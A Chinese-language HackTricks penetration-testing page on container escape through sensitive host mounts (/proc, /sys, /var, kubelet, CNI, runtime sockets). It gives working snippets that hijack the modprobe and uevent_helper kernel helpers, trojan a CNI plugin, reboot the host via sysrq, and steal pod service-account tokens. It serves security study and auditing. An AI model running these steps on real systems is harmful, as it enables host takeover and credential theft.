# Sensitive Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## `/proc` 暴露

Host mounts 是最重要的实际 container-escape attack surface 之一，因为它们经常会将原本经过精心隔离的进程视图，重新折叠为对 host 资源的直接可见性。危险情况并不局限于 `/`。对 `/proc`、`/sys`、`/var`、runtime sockets、kubelet 管理的状态目录或与 device 相关的路径执行 bind mount，都可能暴露 kernel controls、credentials、相邻 containers 的 filesystems 以及 runtime management interfaces。

本页面独立于各个保护页面存在，因为其 abuse model 涉及多个方面。Writable host mount 之所以危险，部分原因在于 mount namespaces，部分原因在于 user namespaces，部分原因在于 AppArmor 或 SELinux 的覆盖范围，还有一部分原因在于具体暴露了哪个 host path。将其作为独立主题处理，可以更容易地分析 attack surface。

## `/proc` 暴露

procfs 同时包含普通的进程信息和高影响力的 kernel control interfaces。因此，类似 `-v /proc:/host/proc` 的 bind mount，或暴露了意外的 writable proc entries 的 container view，可能导致 information disclosure、denial of service 或直接的 host code execution。

高价值的 procfs paths 包括：

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

首先检查哪些高价值的 procfs entries 可见或可写：
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
这些路径因不同原因而值得关注。`core_pattern`、`modprobe` 和 `binfmt_misc` 在可写时可能成为主机 code-execution 路径。`kallsyms`、`kmsg`、`kcore` 和 `config.gz` 是进行 kernel exploitation 时非常有价值的 reconnaissance 来源。`sched_debug` 和 `mountinfo` 会泄露进程、cgroup 及文件系统上下文信息，有助于从 container 内部还原主机布局。

每个路径的实际价值各不相同；如果把它们都视为具有相同影响，会增加 triage 的难度：

- `/proc/sys/kernel/core_pattern`
如果可写，这是 procfs 中影响最大的一类路径，因为 kernel 会在发生崩溃后执行 pipe handler。能够将 `core_pattern` 指向存储在其 overlay 中或某个已挂载主机路径中的 payload 的 container，通常可以获得主机 code execution。另请参阅 [read-only-paths.md](protections/read-only-paths.md) 中的专门示例。
- `/proc/sys/kernel/modprobe`
该路径控制 kernel 在需要调用 module-loading 逻辑时使用的 userspace helper。如果 container 可以写入，并且该路径在主机上下文中被解释，它可能成为另一个主机 code-execution primitive。当存在触发该 helper 路径的方法时尤其值得关注。
- `/proc/sys/vm/panic_on_oom`
这通常不是一种干净的 escape primitive，但它可以将内存压力转化为全主机 denial-of-service：把 OOM 条件转变为 kernel panic 行为。
- `/proc/sys/fs/binfmt_misc`
如果 registration interface 可写，攻击者可能为指定的 magic value 注册 handler，并在执行匹配文件时获得 host-context execution。
- `/proc/config.gz`
对 kernel exploit triage 很有用。无需主机的 package metadata，即可借此确定启用的 subsystem、mitigation 和可选 kernel feature。
- `/proc/sysrq-trigger`
主要是一条 denial-of-service 路径，但危害非常严重。它可以立即 reboot、panic 或以其他方式干扰主机。
- `/proc/kmsg`
会泄露 kernel ring buffer 消息。可用于 host fingerprinting、crash analysis，以及在某些环境中泄露有助于 kernel exploitation 的信息。
- `/proc/kallsyms`
可读时价值很高，因为它会暴露导出的 kernel symbol 信息，并可能帮助在 kernel exploit 开发期间规避 address randomization 的假设。
- `/proc/[pid]/mem`
这是直接的进程内存接口。如果目标进程满足必要的 ptrace-style 条件并且可访问，可能允许读取或修改其他进程的内存。实际影响在很大程度上取决于 credentials、`hidepid`、Yama 和 ptrace 限制，因此它是一条强大但有条件的路径。
- `/proc/kcore`
提供类似 core image 的系统内存视图。该文件非常庞大且难以使用，但如果它确实可读，则表明主机内存暴露面存在严重问题。
- `/proc/kmem` 和 `/proc/mem`
历史上影响很大的 raw memory interface。在许多现代系统中，它们已被禁用或受到严格限制；但如果存在且可用，应将其视为 critical finding。
- `/proc/sched_debug`
会泄露调度和 task 信息，即使其他进程视图看起来比预期更干净，也可能暴露主机进程的 identity。
- `/proc/[pid]/mountinfo`
对于还原 container 实际位于主机何处、确定哪些路径由 overlay 支持，以及判断某个可写 mount 对应的是主机内容还是仅 container layer，都极其有用。

如果 `/proc/[pid]/mountinfo` 或 overlay 详情可读，请使用它们恢复 container filesystem 在主机上的路径：
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
这些命令很有用，因为许多 host-execution 技巧都需要将容器内的路径转换为从 host 视角对应的路径。

### 完整示例：`modprobe` Helper Path Abuse

如果容器内的 `/proc/sys/kernel/modprobe` 可写，且 helper path 在 host context 中被解析，则可以将其重定向到攻击者控制的 payload：
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
具体触发方式取决于目标和 kernel 的行为，但关键点在于：可写的 helper 路径能够将未来的 kernel helper 调用重定向到攻击者控制的 host-path 内容。

### 使用 `kallsyms`、`kmsg` 和 `config.gz` 进行 Kernel Recon：完整示例

如果目标是进行可利用性评估，而不是立即 escape：
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
这些命令有助于判断是否能查看有用的符号信息、近期的 kernel 消息是否泄露了有价值的状态，以及编译时启用了哪些 kernel 功能或缓解措施。其影响通常不是直接 escape，但可以显著缩短 kernel vulnerability triage 的时间。

### Full Example: SysRq 主机重启

如果 `/proc/sysrq-trigger` 可写，并且能够访问 host 视图：
```bash
echo b > /proc/sysrq-trigger
```
其影响是立即重启主机。这不是一个隐蔽的示例，但它清楚地表明，procfs 暴露的后果可能远比信息泄露严重。

## `/sys` 暴露

sysfs 暴露大量内核和设备状态信息。某些 sysfs 路径主要用于指纹识别，而其他路径则可能影响 helper 执行、设备行为、安全模块配置或固件状态。

高价值的 sysfs 路径包括：

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

这些路径的重要性各不相同。`/sys/class/thermal` 可能影响 thermal-management 行为，因此在暴露配置不当的环境中可能影响主机稳定性。`/sys/kernel/vmcoreinfo` 可能泄露 crash-dump 和内核布局信息，从而帮助进行低级别的主机指纹识别。`/sys/kernel/security` 是 Linux Security Modules 使用的 `securityfs` 接口，因此对该路径的意外访问可能暴露或修改与 MAC 相关的状态。EFI 变量路径可能影响由固件支持的启动设置，因此其风险远高于普通配置文件。`/sys/kernel/debug` 下的 `debugfs` 尤其危险，因为它本身就是面向开发者的接口，相较于面向生产环境、经过加固的内核 API，其安全保障预期要低得多。

用于审查这些路径的实用命令如下：
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
这些命令为何值得关注：

- `/sys/kernel/security` 可能暴露 AppArmor、SELinux 或其他 LSM surface，说明原本应仅对 host 可见的内容被暴露出来。
- `/sys/kernel/debug` 通常是这一组发现中最令人担忧的。如果已挂载 `debugfs`，且具有可读或可写权限，应预期存在一个广泛的、面向 kernel 的 surface；其具体风险取决于启用的 debug 节点。
- EFI 变量暴露并不常见，但影响很大，因为它涉及由 firmware 支持的设置，而不是普通的 runtime 文件。
- `/sys/class/thermal` 主要与 host 稳定性和硬件交互有关，而不是用于实现类似 shell 的 escape。
- `/sys/kernel/vmcoreinfo` 主要是 host fingerprinting 和 crash analysis 的来源，有助于理解底层 kernel 状态。

### 完整示例：`uevent_helper`

如果 `/sys/kernel/uevent_helper` 可写，当触发 `uevent` 时，kernel 可能会执行由攻击者控制的 helper：
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
之所以可行，是因为 helper path 是从 host 的视角进行解析的。触发后，helper 会在 host context 中运行，而不是在当前容器内部运行。

## `/var` 暴露

将 host 的 `/var` 挂载到容器中通常被低估了，因为它看起来不像挂载 `/` 那么严重。实际上，这足以访问 runtime sockets、容器 snapshot 目录、kubelet 管理的 pod volumes、投影的 service-account tokens，以及相邻应用的 filesystems。在现代节点上，`/var` 往往是最有 operational value 的容器状态实际所在的位置。

### Kubernetes 示例

带有 `hostPath: /var` 的 pod 通常可以读取其他 pod 的投影 tokens 和 overlay snapshot 内容：
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
这些命令很有用，因为它们可以判断该挂载点暴露的只是无关紧要的应用数据，还是影响重大的 cluster 凭据。可读取的 service-account token 可能会立即将本地代码执行转变为 Kubernetes API 访问权限。

如果 token 存在，应验证它能够访问哪些资源，而不是在发现 token 后就停止：
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
这里的影响可能远不止本地节点访问。具有广泛 RBAC 权限的 token 可以将已挂载的 `/var` 变成对整个集群的 compromise。

### Docker 和 containerd 示例

在 Docker 主机上，相关数据通常位于 `/var/lib/docker` 下；而在由 containerd 支持的 Kubernetes 节点上，相关数据可能位于 `/var/lib/containerd` 或特定 snapshotter 的路径下：
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
如果挂载的 `/var` 暴露了另一个工作负载中可写的 snapshot 内容，attacker 可能无需接触当前 container 配置，就能修改应用文件、植入 web 内容或更改启动脚本。

发现可写的 snapshot 内容后，具体的滥用思路包括：
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
这些命令很有用，因为它们展示了挂载 `/var` 带来的三类主要影响：应用篡改、secret 恢复，以及向相邻 workload 进行 lateral movement。

## Kubelet State、Plugins 和 CNI Paths

`/var/lib/kubelet`、`/opt/cni/bin` 或 `/etc/cni/net.d` 的挂载通常会通过 privileged DaemonSets、CNI agents、CSI node plugins、GPU operators 和 storage helpers 暴露出来。这些挂载很容易被视为“node plumbing”，但它们直接位于新 pod 的执行路径中，并且通常包含 kubelet credentials、projected secrets、registration sockets，以及主机侧可执行的 plugin binaries。

高价值目标包括：

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

有用的审查命令包括：
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
这些路径为何重要：

- `/var/lib/kubelet/pki` 可能暴露 kubelet client certificates 以及其他 node-local credentials；根据 cluster design 的不同，这些凭据有时可以被复用于 API server 或 kubelet-facing TLS endpoints。<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods` 通常包含同一 node 上相邻 pods 的 projected service-account tokens 和 mounted Secrets。
- `/var/lib/kubelet/pod-resources/kubelet.sock` 主要是一个 reconnaissance surface，但非常有用：它会揭示当前哪些 pods 和 containers 占用了 GPUs、hugepages、SR-IOV devices 以及其他稀缺的 node-local resources。<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`、`/var/lib/kubelet/plugins` 和 `/var/lib/kubelet/plugins_registry` 会揭示已安装的 CSI、DRA 和 device plugins，以及 kubelet 预期与之通信的 sockets。如果这些目录可写而不仅仅是可读，该 finding 会严重得多。<sup>[[1]](#references)</sup>
- `/opt/cni/bin` 和 `/etc/cni/net.d` 直接位于 pod-network setup path 上。对这些路径的可写访问通常是一种延迟的 host-execution primitive，而不仅仅是 configuration exposure。<sup>[[2]](#references)</sup>

### 完整示例：可写的 `/opt/cni/bin`

如果 host CNI binary directory 以 read-write 方式挂载，替换其中的 plugin 可能就足以在 kubelet 下次于该 node 上创建 pod sandbox 时获得 host execution：<sup>[[2]](#references)</sup>
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
这不像挂载的 `docker.sock` 那样直接，但在遭到 compromise 的 Kubernetes infrastructure pods 中通常更为现实。关键在于，修改后的 binary 随后会由 host network setup flow 执行，而不是由当前 container 执行。

## Runtime Sockets

敏感的 host mounts 通常包括 runtime sockets，而不是完整目录。这一点非常重要，值得在此明确重申：
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
有关挂载这些 socket 后的完整 exploitation 流程，请参阅 [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md)。

作为一种快速的初始交互模式：
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
如果其中一项成功，从“mounted socket”到“启动一个权限更高的 sibling container”的路径通常比任何 kernel breakout 路径都短得多。

## 可写 Host Path 任务劫持

可写的 host mount 不需要暴露 `/` 才会造成危险。如果挂载路径包含脚本、配置文件、hooks、plugins，或包含稍后由 host 端定时任务或服务使用的文件，那么容器可能能够修改 host 执行的内容。

通用审查流程：
```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```
如果可写文件会被 host process 使用，在测试时应让 payload 保持简单且可观察：
```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```
有趣的部分在于信任边界：写入操作发生在 container 内部，但执行操作稍后发生在 host service 上下文中。这会将一个范围狭窄的 hostPath 或 bind mount 转变为延迟的 host-code-execution 原语。

## Mount 相关 CVE

Host mount 也会与 runtime 漏洞产生交集。近期重要示例包括：

- `runc` 中的 `CVE-2024-21626`：泄露的目录文件描述符可能将工作目录置于 host filesystem 上。
- BuildKit 中的 `CVE-2024-23651`、`CVE-2024-23652` 和 `CVE-2024-23653`：恶意 Dockerfile、frontend 以及 `RUN --mount` 流程可能在构建期间重新引入 host file access、删除操作或 elevated privileges。
- Buildah 和 Podman build 流程中的 `CVE-2024-1753`：构造的 bind mount 可能以 read-write 方式暴露 `/`。
- `containerd` 2.1.0 中的 `CVE-2025-47290`：image unpack 期间的 TOCTOU 可能允许 specially crafted image 在 pull 期间修改 host filesystem。

这些 CVE 在这里很重要，因为它们表明，mount handling 不仅与 operator configuration 有关。runtime 本身也可能引入由 mount 驱动的 escape conditions。

## Checks

使用以下命令快速定位价值最高的 mount exposures：
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
这里有哪些值得关注的内容：

- Host root、`/proc`、`/sys`、`/var` 以及 runtime sockets 都是高优先级发现项。
- 可写的 proc/sys 条目通常意味着该挂载暴露的是 Host 全局 kernel 控制项，而不是安全的 container 视图。
- 对已挂载的 `/var` 路径，不应只进行文件系统审查，还应检查凭据和相邻 workload。
- Kubelet 状态目录以及 CNI/plugin 路径应与 runtime sockets 享有同等优先级，因为它们通常直接位于 Node 的 Pod 创建和凭据分发路径上。

## 参考资料

- [1] [Kubelet 使用的本地文件和路径](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [cilium-agent container 可通过 `hostPath` mount 访问 Host](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)

{{#include ../../../banners/hacktricks-training.md}}
